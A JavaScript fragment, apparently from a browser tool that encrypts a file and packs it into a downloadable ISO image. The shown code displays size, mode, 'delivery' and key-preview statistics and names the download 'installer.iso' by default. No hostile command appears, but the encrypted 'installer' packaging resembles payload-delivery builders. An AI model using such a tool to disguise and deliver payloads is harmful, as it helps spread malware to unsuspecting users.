      keyPreview: keyHex.substring(0, 16) + "…"
    };

    status.textContent = "Done";
    progress.hidden = true;
    result.hidden = false;

    $("#stats").innerHTML = `
      Original: ${formatSize(lastStats.originalSize)}<br>
      Encrypted: ${formatSize(lastStats.encryptedSize)}<br>
      ISO size: ${formatSize(lastStats.isoSize)}<br>
      Mode: ${lastStats.mode.toUpperCase()} • Delivery: ${delivery}<br>
      Key: ${lastStats.keyPreview}
    `;
  } catch (err) {
    console.error(err);
    status.textContent = "Error: " + (err.message || String(err));
    progress.hidden = true;
  } finally {
    btn.disabled = false;
  }
}

function downloadIso() {
  if (!generatedIso) return;
  const name = ($("#isoName").value || "installer.iso").replace(/[^\w.\-]/g, "_");
  const blob = new Blob([generatedIso], { type: "application/x-iso9660-image" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

init();
